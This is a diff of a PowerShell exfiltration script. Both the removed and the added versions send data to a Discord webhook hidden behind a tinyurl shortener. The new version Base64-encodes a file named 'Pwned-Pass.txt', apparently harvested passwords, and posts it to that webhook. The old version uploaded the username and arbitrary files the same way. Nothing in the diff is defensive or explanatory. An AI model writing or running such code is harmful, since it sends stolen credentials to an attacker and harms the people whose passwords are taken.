@@ -1,22 +1,23 @@
-function Upload-Discord {
+# Define your Discord webhook URL
+$webhookUrl = "https://tinyurl.com/3u67z8wa"
 
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
+# Path to the file you want to upload
+$filePath = "Pwned-Pass.txt"
 
-$hookurl = 'https://tinyurl.com/3u67z8wa'
+# Read the content of the file
+$fileContent = Get-Content -Path $filePath -Raw
 
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
+# Base64 encode the file content
+$encodedFileContent = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
 
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+# Create JSON payload
+$jsonPayload = @{
+    "content" = "Here's the file Pwned-Pass.txt:"
+    "file" = @{
+        "name" = "Pwned-Pass.txt"
+        "content" = $encodedFileContent
+    }
+} | ConvertTo-Json
 
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-}
+# Send the request to Discord webhook
+Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonPayload
